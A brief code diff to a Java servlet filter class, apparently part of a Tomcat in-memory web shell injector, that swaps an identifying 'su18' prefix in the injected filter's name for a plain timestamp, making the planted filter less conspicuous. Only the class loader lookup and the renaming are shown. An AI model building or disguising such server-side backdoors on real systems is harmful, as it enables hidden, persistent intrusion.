@@ -22,7 +22,7 @@ public class TFMSFromThread implements Filter {
 
 	static {
 		try {
-			final String name = "su18" + System.nanoTime();
+			final String name = String.valueOf(System.nanoTime());
 
 			WebappClassLoaderBase webappClassLoaderBase =
 					(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
